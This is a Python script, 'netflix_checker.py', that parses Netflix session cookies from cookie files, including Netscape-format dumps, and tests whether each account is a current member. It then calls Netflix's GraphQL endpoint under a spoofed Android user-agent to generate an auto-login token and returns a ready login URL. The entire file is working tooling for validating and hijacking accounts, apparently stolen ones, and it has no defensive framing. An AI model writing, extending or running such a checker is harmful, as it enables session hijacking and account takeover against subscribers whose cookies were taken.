# netflix_checker.py
import re
import requests
from collections import OrderedDict

# Cookie names that indicate a valid Netflix session
NETFLIX_COOKIE_NAMES = {
    'thx_guid', 'tmx_guid', 'nfvdid', 'NetflixId',
    'SecureNetflixId', 'OptanonConsent',
    'netflix-sans-bold-3-loaded', 'netflix-sans-normal-3-loaded'
}

def parse_cookie_string(cookie_str: str) -> OrderedDict:
    """Parse 'key1=value1; key2=value2; ...' into an OrderedDict."""
    cookies = OrderedDict()
    for part in cookie_str.split(';'):
        part = part.strip()
        if not part or '=' not in part:
            continue
        key, val = part.split('=', 1)
        cookies[key.strip()] = val.strip()
    return cookies

def generate_nftoken(cookies_dict: dict) -> str | None:
    """Call Netflix GraphQL to obtain an nftoken from the given cookies."""
    try:
        session = requests.Session()
        for name, value in cookies_dict.items():
            session.cookies.set(name, value, domain='.netflix.com', path='/')

        payload = {
            "operationName": "CreateAutoLoginToken",
            "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
            "extensions": {
                "persistedQuery": {
                    "version": 102,
                    "id": "76e97129-f4b5-41a0-a73c-12e674896849"
                }
            }
        }
        headers = {
            'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13)',
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        }
        resp = session.post(
            'https://android13.prod.ftl.netflix.com/graphql',
            headers=headers,
            json=payload,
            timeout=15
        )
        if resp.status_code == 200:
            data = resp.json()
            token = data.get('data', {}).get('createAutoLoginToken')
            return token
        return None
    except Exception:
        return None

def extract_cookies_dict(file_content: str) -> OrderedDict:
    """
    Extract Netflix cookies from file content (Netscape + inline formats).
    Returns an OrderedDict of cookie name → value.
    """
    cookies = OrderedDict()

    # 1. Netscape format lines starting with .netflix.com
    for line in file_content.splitlines():
        line = line.strip()
        if line.startswith('.netflix.com'):
            parts = line.split()
            if len(parts) >= 7:
                name, value = parts[5], parts[6]
                if name in NETFLIX_COOKIE_NAMES or name.startswith('netflix-sans'):
                    cookies[name] = value

    # 2. Regex for known cookie names in the whole text
    for cookie_name in NETFLIX_COOKIE_NAMES:
        pattern = rf'\b{re.escape(cookie_name)}\s*=\s*([^;\n]+)'
        matches = re.findall(pattern, file_content, re.IGNORECASE)
        if matches:
            cookies[cookie_name] = matches[-1].strip()

    # 3. Generic fallback for any Netflix-ish key
    generic_pattern = r'\b([a-zA-Z0-9_-]+)=([^;\n]+)'
    for match in re.finditer(generic_pattern, file_content):
        name, value = match.group(1), match.group(2).strip()
        if (name in NETFLIX_COOKIE_NAMES or 
            name.startswith('netflix') or 
            name.endswith('Guid') or 
            name in ('OptanonConsent', 'nfvdid')):
            cookies[name] = value

    # Sanity check – remove overly long values
    clean = OrderedDict()
    for k, v in cookies.items():
        if v and len(v) < 5000:
            clean[k] = v
    return clean

def check_cookie_file(file_path: str) -> str | None:
    """
    Main entry point: read a cookie file, validate cookies, generate nftoken.
    Returns the full PC login URL if successful, else None.
    """
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
    except Exception:
        return None

    if not content:
        return None

    cookies_dict = extract_cookies_dict(content)
    if not cookies_dict or 'NetflixId' not in cookies_dict or 'SecureNetflixId' not in cookies_dict:
        return None

    # Validate membership
    session = requests.Session()
    for name, value in cookies_dict.items():
        session.cookies.set(name, value, domain='.netflix.com', path='/')

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Pragma': 'no-cache',
    }
    try:
        resp = session.get('https://www.netflix.com/account/membership',
                           headers=headers, timeout=20, allow_redirects=True)
    except Exception:
        return None

    if 'login' in resp.url.lower():
        return None
    if '"membershipStatus":"CURRENT_MEMBER"' not in resp.text:
        return None

    nftoken = generate_nftoken(cookies_dict)
    if not nftoken:
        return None

    return f"https://netflix.com/?nftoken={nftoken}"